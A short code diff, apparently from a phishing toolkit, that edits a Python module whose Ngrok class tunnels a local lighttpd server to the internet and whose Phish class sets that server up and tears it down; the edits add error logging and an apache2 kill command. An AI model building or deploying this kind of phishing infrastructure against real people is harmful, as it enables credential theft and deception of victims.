@@ -4,8 +4,9 @@
 
 from re import compile
 from time import sleep
-from requests import get  
+from requests import get 
 from subprocess import Popen
+from constants import error_log 
 from os import getcwd, devnull, remove
 
 LIGHT_TPD_CONFIG = '''
@@ -27,11 +28,12 @@ index-file.names = ("index.htm", "index.html")
 class Ngrok(object):
  def __init__(self):
   self.devnull = open(devnull, 'w')
-  self.cmd = ['./ngrok', 'http', '80']
-  self.url = 'http://127.0.0.1:4040/inspect/http'
+  self.error_log = open(error_log, 'a')
+  self.url = 'http://localhost:4040/inspect/http'
 
  def start_ngrok(self):
-  Popen(self.cmd, stdout=self.devnull)
+  Popen(['./ngrok', 'http', '80'], 
+    stdout=self.error_log, stderr=self.error_log)
 
  def stop_ngrok(self):
   Popen(['pkill', 'ngrok']).wait()
@@ -47,7 +49,7 @@ class Ngrok(object):
   except:pass
 
 class Phish(Ngrok):
- def __init__(self):
+ def __init__(self): 
   super(Phish, self).__init__()
 
  def config(self):
@@ -65,6 +67,7 @@ class Phish(Ngrok):
 
  def stop(self):
   try:
+   Popen(['pkill', 'apache2']).wait()
    Popen(['pkill', 'lighttpd']).wait()
    try:remove('.light.conf')
    except:pass 
